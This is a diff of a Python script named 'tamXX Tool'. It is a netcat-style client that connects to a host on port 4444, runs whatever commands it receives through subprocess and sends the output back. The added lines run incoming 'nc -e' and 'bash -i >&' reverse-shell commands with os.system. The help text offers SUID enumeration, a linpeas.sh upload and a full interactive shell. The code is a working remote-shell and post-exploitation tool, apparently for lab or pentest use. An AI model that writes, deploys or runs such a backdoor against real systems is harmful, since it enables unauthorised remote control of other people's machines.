@@ -1,68 +1,55 @@
 #!/usr/bin/env python3
-
 import socket
 import sys, os
-import threading
-import time
 import subprocess
-import signal
-import random
 
 class netcat(object):
     clientHandler = False
-    prompt = False
     port = 4444
     target = ""
-    home = ""
-    user = ""
-    tag = ""
-    value = 'local'
     bufferSize = 2**12
 
 
 
-    def usage(self,value):
-        if value == 'local':
-            print("""
-            tamXX Tool :\n
+    def usageOff(self):
+        print("""
+        tamXX Tool :\n
+        [OPTIONS] :
+        \t\t-l , --listen\t\t\t-     listen on [host]:[port] for incoming connections
+        \t\t--target [IP]\t\t\t-     target
+        \t\t-p , --port [PORT]\t\t\t-     port
+        \t\t--prompt\t\t\t-     initialize prompt
+        \t\t-h , --help\t\t\t-     get some help ;)
+        """)
+        sys.exit()
+    def usageOn(self):
+        print("""
+            WE ARE ON ! WHAT CAN I DO ?
             [OPTIONS] :
-            \t\t--target [IP]\t\t\t-     target
-            \t\t-p , --port [PORT]\t\t\t-     port
-            \t\t--prompt\t\t\t-     initialize prompt
-            \t\t-h , --help\t\t\t-     get some help ;)
+            \t\tFirst, you can execute almost same commands like real shell!
+            \t\thelp\t\tget some help ;)
+            \t\tsuid\t\tget all suid binaries !
+            \t\tlinpeas\t\tupload linpeas.sh on machine
+            \t\tshell\t\tget full interactive shell
             """)
-            sys.exit(0)
-        elif value == 'rhost':
-            print("""
-                WE ARE ON ! WHAT CAN I DO ?
-                [OPTIONS] :
-                \t\tFirst, you can execute almost same commands like real shell!
-                \t\thelp\t\tget some help ;)
-                \t\tsuid\t\tget all suid binaries !
-                \t\tlinpeas\t\tupload linpeas.sh on machine
-                \t\tshell\t\tget full interactive shell
-                """)
-
-
 
 
     def main(self):
-
-        listArgs = " ".join(sys.argv[1:]).split('-')
+        args = sys.argv
+        listArgs = " ".join(args[1:]).split('-')
         while ("" in listArgs):
             listArgs.remove("")
         newListArgs = []
         for arg in listArgs:
             arg = arg.replace(' ','%')
             newListArgs.append(arg)
+        listArgs = newListArgs
 
         if not len(sys.argv[1:]):
-            self.usage(self.value)
-
-        for opt in newListArgs:
-            #print(opt)
+            self.usageOff()
+        for opt in listArgs:
             if opt == "h%" or opt == "help%" or opt == "help" or opt == "h":
-                self.usage(self.value)
+                self.usageOff()
             elif "p%" in opt or "port%" in opt:
                 opts = opt.split("%")
                 self.port = int(opts[1])
@@ -73,11 +60,12 @@ class netcat(object):
                 self.clientHandler = True
             else:
                 print("ERROR")
-                self.usage(self.value)
+                self.usageOff()
 
         if self.clientHandler:
             self.clientLoop()
-
+        else:
+            print('ERROR')
 
 
 
@@ -102,25 +90,18 @@ class netcat(object):
             elif 'whoami' in recv or "pwd" in recv:
                 output = subprocess.getoutput(recv)
                 s.send(output.encode())
+            elif 'nc -e' in recv or 'bash -i >&' in recv:
+                os.system(recv)
+                s.send(b"\n[*] OPEN NEW SHELL\n")
             else:
-                #print(recv)
-                #res = self.bash_(recv)
-                #print(res)
-                #s.send(res.encode())
-
-
 
                 output = recv+'\n\n'
                 output = subprocess.getoutput(recv)+ '\n'
                 s.send(output.encode())
 
-
-
                 #CMD = subprocess.Popen(recv, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                 #s.send(CMD.stdout.read())
                 #s.send(CMD.stderr.read())
-
-
 
 
 if __name__ == "__main__":
